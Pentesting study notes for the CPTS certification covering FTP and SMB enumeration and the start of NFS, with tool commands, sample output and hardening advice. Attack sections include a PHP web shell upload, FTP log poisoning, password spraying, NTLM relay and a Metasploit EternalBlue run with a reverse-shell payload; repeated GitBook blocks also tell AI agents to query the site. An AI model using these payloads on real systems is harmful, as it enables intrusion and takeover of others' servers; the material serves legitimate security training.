@@ -1,0 +1,3753 @@
+---
+title: "Network Services"
+---
+
+- [FTP Enumeration](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services/ftp-enumeration.md)
+- [SMB Enumeration](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services/smb-enumeration.md)
+- [NFS Enumeration](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services/nfs-enumeration.md)
+- [SMTP Enumeration](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services/smtp-enumeration.md)
+- [Email Services (IMAP/POP3)](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services/email-enumeration.md)
+- [SNMP Enumeration](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services/snmp-enumeration.md)
+- [IPMI Enumeration](https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services/ipmi-enumeration.md)
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## FTP Enumeration
+
+## **Protocol Overview**
+
+**FTP Characteristics:**
+
+* **Ports**: 21 (control), 20 (data)
+* **Protocol**: TCP-based
+* **Authentication**: Clear-text (unless FTPS)
+* **Modes**: Active vs Passive
+
+**FTP Connection Types:**
+
+1. **Active FTP**: Client opens control channel (port 21), server initiates data channel (port 20)
+2. **Passive FTP**: Client initiates both control and data channels (firewall-friendly)
+
+**TFTP (Trivial FTP):**
+
+* **Port**: 69/UDP
+* **Authentication**: None
+* **Features**: Simplified, no directory listing
+* **Security**: Local networks only
+
+## **Common FTP Servers**
+
+| Server        | Description             | Config File                     |
+| ------------- | ----------------------- | ------------------------------- |
+| **vsftpd**    | Very Secure FTP Daemon  | `/etc/vsftpd.conf`              |
+| **ProFTPD**   | Professional FTP server | `/etc/proftpd/proftpd.conf`     |
+| **Pure-FTPd** | Secure FTP server       | `/etc/pure-ftpd/pure-ftpd.conf` |
+
+## **vsftpd Configuration Analysis**
+
+**Installation and Setup:**
+
+```bash wrap
+sudo apt install vsftpd
+cat /etc/vsftpd.conf | grep -v "#"
+```
+
+**Key Configuration Settings:**
+
+| Setting                    | Value  | Description                 |
+| -------------------------- | ------ | --------------------------- |
+| `listen=NO`                | YES/NO | Run as standalone daemon?   |
+| `anonymous_enable=NO`      | YES/NO | Allow anonymous access?     |
+| `local_enable=YES`         | YES/NO | Allow local users to login? |
+| `write_enable=YES`         | YES/NO | Allow FTP write commands?   |
+| `dirmessage_enable=YES`    | YES/NO | Display directory messages? |
+| `xferlog_enable=YES`       | YES/NO | Log uploads/downloads?      |
+| `connect_from_port_20=YES` | YES/NO | Use port 20 for data?       |
+| `ssl_enable=NO`            | YES/NO | Enable SSL/TLS encryption?  |
+
+**User Access Control:**
+
+```bash wrap
+# File controlling FTP access
+cat /etc/ftpusers
+
+guest
+john  
+kevin
+```
+
+## **Dangerous FTP Configurations**
+
+### **Anonymous Access Settings**
+
+```bash wrap
+anonymous_enable=YES              # Allow anonymous login
+anon_upload_enable=YES            # Anonymous upload capability  
+anon_mkdir_write_enable=YES       # Anonymous directory creation
+no_anon_password=YES              # No password required
+anon_root=/home/username/ftp      # Anonymous user directory
+write_enable=YES                  # Enable write commands
+```
+
+### **Information Disclosure Settings**
+
+```bash wrap
+hide_ids=YES                      # Hide real UIDs/GIDs (show as 'ftp')
+ls_recurse_enable=YES             # Allow recursive listings
+chroot_local_user=YES             # Jail users in home directory
+chroot_list_enable=YES            # Use chroot list
+```
+
+## **FTP Enumeration Techniques**
+
+### **1. Nmap FTP Scanning**
+
+**Basic FTP Scan:**
+
+```bash wrap
+# Standard FTP scan
+sudo nmap -sV -p21 -sC -A target_ip
+
+# FTP-specific scripts
+sudo nmap -p21 --script ftp-* target_ip
+```
+
+**Available Nmap FTP Scripts:**
+
+```bash wrap
+# Find FTP scripts
+find /usr/share/nmap/scripts/ -name "*ftp*"
+
+ftp-anon.nse                   # Anonymous FTP testing
+ftp-banner.nse                 # Banner grabbing
+ftp-bounce.nse                 # FTP bounce attack testing
+ftp-brute.nse                  # FTP brute force
+ftp-libopie.nse               # libopie buffer overflow
+ftp-proftpd-backdoor.nse      # ProFTPD backdoor detection
+ftp-syst.nse                  # System information
+ftp-vsftpd-backdoor.nse       # vsftpd backdoor detection
+ftp-vuln-cve2010-4221.nse     # ProFTPD directory traversal
+```
+
+**Example Nmap Output:**
+
+```bash wrap
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 1002     1002          220 Apr 16 2021 test.txt
+|_Only these file types are allowed: txt, log, cfg
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.4
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+```
+
+### **2. Manual FTP Banner Grabbing**
+
+```bash wrap
+# Netcat banner grabbing
+nc -nv target_ip 21
+
+# Telnet banner grabbing
+telnet target_ip 21
+
+# Example response:
+220 (vsFTPd 3.0.3)
+```
+
+### **3. Anonymous FTP Testing**
+
+```bash wrap
+# Basic anonymous login
+ftp target_ip
+# Username: anonymous
+# Password: anonymous (or your email)
+
+# Alternative anonymous credentials
+# Username: ftp
+# Password: ftp
+
+# Successful anonymous login example:
+Connected to target_ip.
+220 (vsFTPd 3.0.3)
+Name (target_ip:user): anonymous
+331 Please specify the password.
+Password: anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+```
+
+### **4. FTP Directory Enumeration**
+
+**Basic Commands:**
+
+```bash wrap
+# List files and directories
+ftp> ls
+ftp> dir
+
+# Long format listing
+ftp> ls -la
+
+# Navigate directories
+ftp> cd directory_name
+ftp> pwd
+
+# Download files
+ftp> get filename.txt
+ftp> mget *.txt
+
+# Binary mode for executables/images
+ftp> binary
+ftp> get application.exe
+```
+
+**Mass Download:**
+
+```bash wrap
+# Download all accessible files using wget
+wget -m --no-passive ftp://anonymous:anonymous@target_ip
+
+# Results in directory structure:
+tree target_ip/
+└── target_ip
+    ├── Calendar.pptx
+    ├── Clients
+    │   └── Inlanefreight
+    │       ├── appointments.xlsx
+    │       ├── contract.docx
+    │       └── meetings.txt
+    └── Important Notes.txt
+```
+
+**File Upload Testing:**
+
+```bash wrap
+# Create test file
+touch testupload.txt
+
+# Upload test
+ftp> put testupload.txt
+local: testupload.txt remote: testupload.txt
+---> STOR testupload.txt
+150 Ok to send data.
+226 Transfer complete.
+
+# Verify upload
+ftp> ls
+-rw-------    1 1002     133             0 Sep 15 14:57 testupload.txt
+```
+
+## **Advanced FTP Enumeration**
+
+### **1. SSL/TLS FTP (FTPS)**
+
+**Connecting to FTPS:**
+
+```bash wrap
+# OpenSSL for FTPS connection
+openssl s_client -connect target_ip:21 -starttls ftp
+
+# Certificate information extraction
+CONNECTED(00000003)
+depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, 
+        OU = Dev, CN = master.inlanefreight.htb, 
+        emailAddress = admin@inlanefreight.htb
+```
+
+**Information from SSL Certificates:**
+
+* **Hostname**: master.inlanefreight.htb
+* **Organization**: Inlanefreight
+* **Email**: <admin@inlanefreight.htb>
+* **Location**: Sacramento, California
+
+### **2. FTP Bounce Attacks**
+
+**Concept**: Use FTP server as proxy for port scanning
+
+```bash wrap
+# Nmap FTP bounce scan
+nmap -b anonymous:password@ftp_server target_network
+
+# Manual FTP bounce
+ftp> port 192,168,1,100,0,22  # Target 192.168.1.100:22
+ftp> list                     # Trigger connection
+```
+
+### **3. Configuration File Analysis**
+
+**Common Configuration Weaknesses:**
+
+```bash wrap
+# Dangerous permission settings
+-rwxrwxrwx files (world-writable)
+drwxrwxrwx directories (world-writable)
+
+# Information disclosure
+hide_ids=NO (shows real UIDs/GIDs)
+ls_recurse_enable=YES (allows recursive listing)
+
+# Authentication bypasses  
+anonymous_enable=YES
+no_anon_password=YES
+```
+
+## **FTP Security Issues**
+
+### **1. Anonymous Access**
+
+* **Risk**: Unauthorized file access/upload
+* **Detection**: `ftp-anon` Nmap script
+* **Exploitation**: Mass download, malicious uploads
+
+### **2. Clear-text Authentication**
+
+* **Risk**: Credential interception
+* **Detection**: Network sniffing
+* **Mitigation**: Use FTPS/SFTP
+
+### **3. Directory Traversal**
+
+* **Risk**: Access outside FTP root
+* **Exploitation**: `../../../etc/passwd`
+* **Detection**: Manual testing
+
+### **4. Write Permissions**
+
+* **Risk**: Web shell upload
+* **Exploitation**: Upload PHP/ASPX shells
+* **Impact**: Remote code execution
+
+## **FTP Attack Vectors**
+
+### **1. Web Shell Upload**
+
+```bash wrap
+# Create PHP web shell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# Upload to web-accessible FTP directory
+ftp> put shell.php
+
+# Access via web browser
+http://target.com/ftp_dir/shell.php?cmd=id
+```
+
+### **2. Log Poisoning**
+
+```bash wrap
+# Inject code in FTP logs via username
+ftp target_ip
+# Username: <?php system($_GET['cmd']); ?>
+
+# Include FTP log in LFI
+http://target.com/page.php?file=/var/log/vsftpd.log&cmd=id
+```
+
+### **3. Configuration Exploitation**
+
+```bash wrap
+# Exploit writable config
+ftp> put malicious.conf vsftpd.conf
+
+# Service restart triggers malicious config
+# Potential RCE or privilege escalation
+```
+
+## **FTP Enumeration Checklist**
+
+### **Initial Reconnaissance**
+
+* [ ] Port 21 TCP scan with version detection
+* [ ] Anonymous access testing
+* [ ] Banner grabbing and version identification
+* [ ] SSL certificate analysis (if FTPS)
+
+### **Authentication Testing**
+
+* [ ] Anonymous login attempt
+* [ ] Default credentials testing
+* [ ] Brute force attack (if applicable)
+* [ ] User enumeration
+
+### **Directory Enumeration**
+
+* [ ] Directory listing permissions
+* [ ] Recursive listing capabilities
+* [ ] Hidden files/directories
+* [ ] File permissions analysis
+
+### **File Operations Testing**
+
+* [ ] Download capabilities
+* [ ] Upload capabilities
+* [ ] File modification permissions
+* [ ] Directory creation permissions
+
+### **Security Testing**
+
+* [ ] Directory traversal attempts
+* [ ] FTP bounce attack testing
+* [ ] Buffer overflow testing
+* [ ] Configuration file access
+
+## **Tools for FTP Enumeration**
+
+### **Command Line Tools**
+
+```bash wrap
+# Built-in FTP client
+ftp target_ip
+
+# Netcat for raw interaction
+nc -nv target_ip 21
+
+# OpenSSL for FTPS
+openssl s_client -connect target_ip:21 -starttls ftp
+
+# Wget for mass download
+wget -m --no-passive ftp://user:pass@target_ip
+```
+
+### **Automated Tools**
+
+```bash wrap
+# Nmap with FTP scripts
+nmap -p21 --script ftp-* target_ip
+
+# Hydra for brute forcing
+hydra -l user -P passwords.txt ftp://target_ip
+
+# FTP enumeration scripts
+ftpmap -s target_ip
+```
+
+## **Defensive Measures**
+
+### **FTP Server Hardening**
+
+* **Disable anonymous access** unless required
+* **Use strong authentication** mechanisms
+* **Implement SSL/TLS** encryption (FTPS)
+* **Restrict file permissions** and chroot users
+* **Log and monitor** FTP activities
+* **Regular security updates** and patches
+
+### **Network Security**
+
+* **Firewall rules** to restrict FTP access
+* **VPN requirements** for external access
+* **Network segmentation** for FTP servers
+* **Intrusion detection** for FTP anomalies
+
+***
+
+## **References**
+
+* HTB Academy: Host Based Enumeration - FTP
+* vsftpd Documentation: <https://security.appspot.com/vsftpd.html>
+* RFC 959: File Transfer Protocol (FTP)
+* OWASP Testing Guide: Testing for FTP
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services/ftp-enumeration.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## SMB Enumeration
+
+## Protocol Overview
+
+**SMB Characteristics:**
+
+* **Ports**: 139 (NetBIOS), 445 (Direct SMB)
+* **Protocol**: TCP-based
+* **Purpose**: File/printer sharing, network resource access
+* **Implementation**: Windows (native), Linux (Samba)
+
+**SMB Versions:**
+
+| Version          | Supported OS        | Key Features                           |
+| ---------------- | ------------------- | -------------------------------------- |
+| **CIFS/SMB 1.0** | Windows NT 4.0/2000 | NetBIOS interface, Direct TCP          |
+| **SMB 2.0**      | Windows Vista/2008  | Performance upgrades, message signing  |
+| **SMB 2.1**      | Windows 7/2008 R2   | Locking mechanisms                     |
+| **SMB 3.0**      | Windows 8/2012      | Multichannel, end-to-end encryption    |
+| **SMB 3.1.1**    | Windows 10/2016     | AES-128 encryption, integrity checking |
+
+**Samba Implementation:**
+
+* **Purpose**: SMB/CIFS implementation for Unix-based systems
+* **Components**: smbd (SMB daemon), nmbd (NetBIOS daemon)
+* **Active Directory**: Full domain controller capabilities (v4+)
+
+## Common SMB Configurations
+
+### Samba Configuration File
+
+```bash wrap
+# Main configuration file
+cat /etc/samba/smb.conf | grep -v "#\|\;"
+
+[global]
+   workgroup = DEV.INFREIGHT.HTB
+   server string = DEVSMB
+   log file = /var/log/samba/log.%m
+   max log size = 1000
+   server role = standalone server
+   map to guest = bad user
+   usershare allow guests = yes
+
+[printers]
+   comment = All Printers
+   browseable = no
+   path = /var/spool/samba
+   printable = yes
+   guest ok = no
+
+[notes]
+   comment = CheckIT
+   path = /mnt/notes/
+   browseable = yes
+   read only = no
+   writable = yes
+   guest ok = yes
+```
+
+### Key Configuration Settings
+
+| Setting                        | Description           | Security Impact        |
+| ------------------------------ | --------------------- | ---------------------- |
+| `[sharename]`                  | Network share name    | Enumeration target     |
+| `workgroup = WORKGROUP`        | Workgroup/domain name | Domain information     |
+| `path = /path/here/`           | Directory path        | File system access     |
+| `server string = STRING`       | Banner information    | Information disclosure |
+| `usershare allow guests = yes` | Guest access          | Anonymous enumeration  |
+| `map to guest = bad user`      | Invalid user handling | Authentication bypass  |
+| `browseable = yes`             | Share visibility      | Share enumeration      |
+| `guest ok = yes`               | Anonymous access      | Unauthenticated access |
+| `read only = no`               | Write permissions     | File upload capability |
+| `writable = yes`               | Write access          | Malicious file upload  |
+
+## Dangerous SMB Settings
+
+### High-Risk Configurations
+
+```bash wrap
+browseable = yes              # Allow share listing
+read only = no               # Enable write access
+writable = yes               # Allow file modification
+guest ok = yes               # Anonymous access
+enable privileges = yes      # Honor SID privileges
+create mask = 0777           # Full permissions for new files
+directory mask = 0777        # Full permissions for directories
+logon script = script.sh     # Login script execution
+magic script = script.sh     # Script on connection close
+magic output = script.out    # Script output location
+```
+
+## SMB Enumeration Techniques
+
+### 1. Nmap SMB Scanning
+
+**Basic SMB Scan:**
+
+```bash wrap
+# Standard SMB scan
+sudo nmap -sV -sC -p139,445 target_ip
+
+# SMB-specific scripts
+sudo nmap -p445 --script smb-* target_ip
+```
+
+**Available Nmap SMB Scripts:**
+
+```bash wrap
+# Find SMB scripts
+find / -name "*smb*" 2>/dev/null | grep scripts
+
+smb-enum-domains.nse           # Domain enumeration
+smb-enum-groups.nse            # Group enumeration  
+smb-enum-processes.nse         # Process enumeration
+smb-enum-sessions.nse          # Session enumeration
+smb-enum-shares.nse            # Share enumeration
+smb-enum-users.nse             # User enumeration
+smb-os-discovery.nse           # OS information
+smb-protocols.nse              # Protocol versions
+smb-security-mode.nse          # Security settings
+smb-server-stats.nse           # Server statistics
+smb-system-info.nse            # System information
+smb-vuln-*.nse                 # Vulnerability checks
+```
+
+**Example Nmap Output:**
+
+```bash wrap
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+
+Host script results:
+|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-09-19T13:16:04
+|_  start_date: N/A
+```
+
+### 2. SMBclient Enumeration
+
+**Share Listing:**
+
+```bash wrap
+# List shares with null session
+smbclient -N -L //target_ip
+
+# Connect to specific share
+smbclient //target_ip/sharename
+
+# Anonymous connection
+smbclient -N //target_ip/sharename
+```
+
+**SMBclient Commands:**
+
+```bash wrap
+# Directory operations
+smb: \> ls                    # List directory contents
+smb: \> cd directory          # Change directory
+smb: \> pwd                   # Current directory
+smb: \> mkdir newdir          # Create directory
+
+# File operations  
+smb: \> get filename          # Download file
+smb: \> put localfile         # Upload file
+smb: \> mget *.txt           # Download multiple files
+smb: \> del filename          # Delete file
+
+# System commands
+smb: \> !ls                   # Execute local command
+smb: \> help                  # List available commands
+```
+
+**Example SMBclient Session:**
+
+```bash wrap
+smbclient //10.129.14.128/notes
+Enter WORKGROUP\username's password: 
+Anonymous login successful
+
+smb: \> ls
+  .                                   D        0  Wed Sep 22 18:17:51 2021
+  ..                                  D        0  Wed Sep 22 12:03:59 2021
+  prep-prod.txt                       N       71  Sun Sep 19 15:45:21 2021
+
+smb: \> get prep-prod.txt
+getting file \prep-prod.txt of size 71 as prep-prod.txt (8.7 KiloBytes/sec)
+
+smb: \> !cat prep-prod.txt
+[] check your code with the templates
+[] run code-assessment.py
+```
+
+### 3. RPCclient Enumeration
+
+**RPC Connection:**
+
+```bash wrap
+# Connect with null session
+rpcclient -U "" target_ip
+rpcclient -N target_ip
+
+# Alternative authentication
+rpcclient -U "username" target_ip
+```
+
+**RPCclient Commands:**
+
+| Command                   | Description            |
+| ------------------------- | ---------------------- |
+| `srvinfo`                 | Server information     |
+| `enumdomains`             | Enumerate domains      |
+| `querydominfo`            | Domain information     |
+| `netshareenumall`         | List all shares        |
+| `netsharegetinfo <share>` | Share information      |
+| `enumdomusers`            | Enumerate domain users |
+| `queryuser <RID>`         | User information       |
+| `enumdomgroups`           | Enumerate groups       |
+| `querygroup <RID>`        | Group information      |
+
+**Example RPCclient Session:**
+
+```bash wrap
+rpcclient $> srvinfo
+        DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+rpcclient $> enumdomains
+name:[DEVSMB] idx:[0x0]
+name:[Builtin] idx:[0x1]
+
+rpcclient $> netshareenumall
+netname: notes
+        remark: CheckIT
+        path:   C:\mnt\notes\
+        password:
+
+rpcclient $> enumdomusers
+user:[mrb3n] rid:[0x3e8]
+user:[cry0l1t3] rid:[0x3e9]
+
+rpcclient $> queryuser 0x3e9
+        User Name   :   cry0l1t3
+        Full Name   :   cry0l1t3
+        Home Drive  :   \\devsmb\cry0l1t3
+        Profile Path:   \\devsmb\cry0l1t3\profile
+        Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST
+```
+
+### 4. User RID Brute Forcing
+
+**Bash RID Enumeration:**
+
+```bash wrap
+# Brute force RIDs 500-1100
+for i in $(seq 500 1100);do 
+    rpcclient -N -U "" target_ip -c "queryuser 0x$(printf '%x\n' $i)" | 
+    grep "User Name\|user_rid\|group_rid" && echo ""
+done
+
+# Results:
+        User Name   :   sambauser
+        user_rid :      0x1f5
+        group_rid:      0x201
+		
+        User Name   :   mrb3n
+        user_rid :      0x3e8
+        group_rid:      0x201
+```
+
+**Impacket samrdump.py:**
+
+```bash wrap
+# Automated user enumeration
+samrdump.py target_ip
+
+# Example output:
+Found user: mrb3n, uid = 1000
+Found user: cry0l1t3, uid = 1001
+mrb3n (1000)/FullName: 
+mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59
+cry0l1t3 (1001)/FullName: cry0l1t3
+cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56
+```
+
+### 5. Advanced SMB Tools
+
+**SMBMap:**
+
+```bash wrap
+# Basic share enumeration
+smbmap -H target_ip
+
+# With credentials
+smbmap -H target_ip -u username -p password
+
+# Recursive directory listing
+smbmap -H target_ip -R
+
+# Example output:
+[+] IP: 10.129.14.128:445       Name: 10.129.14.128                                     
+        Disk                                    Permissions     Comment
+        ----                                    -----------     -------
+        print$                                  NO ACCESS       Printer Drivers
+        home                                    NO ACCESS       INFREIGHT Samba
+        dev                                     NO ACCESS       DEVenv
+        notes                                   READ,WRITE      CheckIT
+        IPC$                                    NO ACCESS       IPC Service (DEVSM)
+```
+
+**CrackMapExec:**
+
+```bash wrap
+# Share enumeration
+crackmapexec smb target_ip --shares -u '' -p ''
+
+# User enumeration  
+crackmapexec smb target_ip -u '' -p '' --users
+
+# Password spraying
+crackmapexec smb target_ip -u users.txt -p passwords.txt
+
+# Example output:
+SMB         10.129.14.128   445    DEVSMB    [+] Enumerated shares
+SMB         10.129.14.128   445    DEVSMB    Share           Permissions     Remark
+SMB         10.129.14.128   445    DEVSMB    notes           READ,WRITE      CheckIT
+```
+
+**Enum4Linux-ng:**
+
+```bash wrap
+# Installation
+git clone https://github.com/cddmp/enum4linux-ng.git
+cd enum4linux-ng
+pip3 install -r requirements.txt
+
+# Comprehensive enumeration
+./enum4linux-ng.py target_ip -A
+
+# Specific enumeration
+./enum4linux-ng.py target_ip -U  # Users
+./enum4linux-ng.py target_ip -S  # Shares
+./enum4linux-ng.py target_ip -G  # Groups
+```
+
+## SMB Security Issues
+
+### 1. Anonymous Access
+
+* **Risk**: Unauthorized share access and information disclosure
+* **Detection**: Null session connections
+* **Exploitation**: Data theft, user enumeration
+
+### 2. Weak Authentication
+
+* **Risk**: Credential-based attacks
+* **Detection**: Password spraying, brute force
+* **Exploitation**: Account compromise
+
+### 3. Excessive Share Permissions
+
+* **Risk**: Unauthorized file access/modification
+* **Detection**: Permission enumeration
+* **Exploitation**: Data manipulation, malware deployment
+
+### 4. Information Disclosure
+
+* **Risk**: Sensitive data exposure
+* **Detection**: Share browsing, file enumeration
+* **Exploitation**: Intelligence gathering
+
+## SMB Attack Vectors
+
+### 1. Share Exploitation
+
+```bash wrap
+# File upload for web shells
+smbclient //target/webshare
+smb: \> put shell.php
+
+# Configuration file access
+smbclient //target/config
+smb: \> get database.conf
+```
+
+### 2. Password Attacks
+
+```bash wrap
+# Hydra SMB brute force
+hydra -l user -P passwords.txt smb://target_ip
+
+# CrackMapExec password spraying
+crackmapexec smb target_ip -u users.txt -p 'Password123!'
+```
+
+### 3. Relay Attacks
+
+```bash wrap
+# SMB relay with Responder
+responder -I eth0 -A
+
+# ntlmrelayx.py for relay attacks
+ntlmrelayx.py -tf targets.txt -smb2support
+```
+
+## Common Vulnerabilities
+
+### Critical SMB CVEs
+
+| CVE                | Name                  | Impact                | Affected Versions                            |
+| ------------------ | --------------------- | --------------------- | -------------------------------------------- |
+| **CVE-2017-0144**  | EternalBlue           | Remote Code Execution | Windows Vista - Windows 10, Server 2008-2016 |
+| **CVE-2020-0796**  | SMBGhost (CoronaBlue) | Remote Code Execution | Windows 10 v1903/v1909, Server v1903/v1909   |
+| **CVE-2017-7494**  | SambaCry              | Remote Code Execution | Samba 3.5.0 - 4.6.4/4.5.10/4.4.14            |
+| **CVE-2016-2118**  | Badlock               | Man-in-the-Middle     | Windows/Samba NTLM authentication            |
+| **CVE-2017-12149** | SMBLoris              | Denial of Service     | Windows SMB implementations                  |
+
+### EternalBlue (CVE-2017-0144)
+
+```bash wrap
+# Nmap EternalBlue detection
+nmap -p445 --script smb-vuln-ms17-010 target
+
+# Metasploit exploitation
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS target
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST attacker_ip
+exploit
+
+# Manual verification
+python checker.py target 445
+```
+
+### SMBGhost (CVE-2020-0796)
+
+```bash wrap
+# Detection script
+nmap -p445 --script smb-vuln-cve2020-0796 target
+
+# Proof of concept
+python3 cve-2020-0796.py target
+
+# Metasploit module
+use auxiliary/scanner/smb/smb_ms20_004
+set RHOSTS target
+run
+```
+
+### SambaCry (CVE-2017-7494)
+
+```bash wrap
+# Vulnerability detection
+nmap -p445 --script smb-vuln-cve2017-7494 target
+
+# Manual check
+smbclient //target/share -N
+smb: \> allinfo /path/to/shared/library.so
+
+# Exploitation requirements:
+# - Samba version 3.5.0+
+# - File upload to SMB share
+# - Knowledge of share path on server
+```
+
+### Badlock (CVE-2016-2118)
+
+```bash wrap
+# NTLM authentication weaknesses
+# Man-in-the-middle attacks on SMB authentication
+# Affects both Windows and Samba implementations
+
+# Detection
+enum4linux-ng.py target -A | grep -i "signing"
+rpcclient -N target -c "getdcname"
+```
+
+### Additional SMB Vulnerabilities
+
+* **CVE-2008-4250**: MS08-067 Conficker vulnerability
+* **CVE-2017-0145**: EternalBlue variant (MS17-010)
+* **CVE-2017-0146**: EternalBlue variant (MS17-010)
+* **CVE-2019-0708**: BlueKeep (RDP, but often found with SMB)
+* **CVE-2020-1472**: Zerologon (NetLogon, SMB-related)
+
+### Vulnerability Scanning
+
+```bash wrap
+# Comprehensive SMB vulnerability scan
+nmap -p445 --script smb-vuln-* target
+
+# Specific vulnerability checks
+nmap -p445 --script smb-vuln-ms17-010 target        # EternalBlue
+nmap -p445 --script smb-vuln-cve2020-0796 target    # SMBGhost
+nmap -p445 --script smb-vuln-cve2017-7494 target    # SambaCry
+
+# Metasploit auxiliary scanners
+use auxiliary/scanner/smb/smb_ms17_010              # EternalBlue scanner
+use auxiliary/scanner/smb/smb_ms20_004              # SMBGhost scanner
+```
+
+## SMB Enumeration Checklist
+
+### Initial Reconnaissance
+
+* [ ] Port scanning (139, 445)
+* [ ] SMB version identification
+* [ ] NetBIOS name enumeration
+* [ ] Null session testing
+
+### Share Enumeration
+
+* [ ] Share listing and access testing
+* [ ] Permission analysis
+* [ ] File and directory enumeration
+* [ ] Sensitive file discovery
+
+### User Enumeration
+
+* [ ] RID cycling for user discovery
+* [ ] User information gathering
+* [ ] Group membership analysis
+* [ ] Password policy enumeration
+
+### Authentication Testing
+
+* [ ] Anonymous access testing
+* [ ] Default credential testing
+* [ ] Password spraying
+* [ ] Brute force attacks
+
+### Advanced Testing
+
+* [ ] SMB relay attack testing
+* [ ] Vulnerability scanning
+* [ ] Configuration analysis
+* [ ] Privilege escalation vectors
+
+## Tools for SMB Enumeration
+
+### Built-in Tools
+
+```bash wrap
+# SMB client
+smbclient -L //target_ip
+
+# RPC client
+rpcclient -U "" target_ip
+
+# NetBIOS enumeration
+nmblookup -A target_ip
+```
+
+### Specialized Tools
+
+```bash wrap
+# SMBMap
+smbmap -H target_ip
+
+# CrackMapExec
+crackmapexec smb target_ip --shares
+
+# Enum4Linux-ng
+enum4linux-ng.py target_ip -A
+
+# Impacket tools
+samrdump.py target_ip
+smbexec.py domain/user:pass@target_ip
+```
+
+### Nmap Scripts
+
+```bash wrap
+# Comprehensive SMB scan
+nmap -p445 --script smb-enum-*,smb-vuln-*,smb-os-discovery target_ip
+```
+
+## Defensive Measures
+
+### SMB Server Hardening
+
+* **Disable SMBv1** - Use SMBv2/v3 only
+* **Restrict anonymous access** - Disable null sessions
+* **Implement strong authentication** - Kerberos, NTLM restrictions
+* **Use share-level permissions** - Principle of least privilege
+* **Enable message signing** - Prevent tampering
+* **Regular security updates** - Patch known vulnerabilities
+
+### Network Security
+
+* **Firewall restrictions** - Block SMB ports externally
+* **Network segmentation** - Isolate file servers
+* **Monitor SMB traffic** - Detect anomalies
+* **Implement SMB over VPN** - Secure remote access
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services/smb-enumeration.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## NFS Enumeration
+
+## Overview
+
+Network File System (NFS) is a network file system developed by Sun Microsystems with the same purpose as SMB - to access file systems over a network as if they were local. However, it uses an entirely different protocol and is primarily used between Linux and Unix systems.
+
+**Key Characteristics:**
+
+* Uses ONC-RPC/SUN-RPC protocol on TCP/UDP port 111
+* Main service runs on TCP/UDP port 2049
+* Uses External Data Representation (XDR) for system-independent data exchange
+* No built-in authentication mechanism (relies on RPC protocol options)
+* Authorization derived from file system information
+
+## NFS Versions
+
+| Version     | Features                                                                                                                                                                                       |
+| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **NFSv2**   | Older version supported by many systems, initially operated entirely over UDP                                                                                                                  |
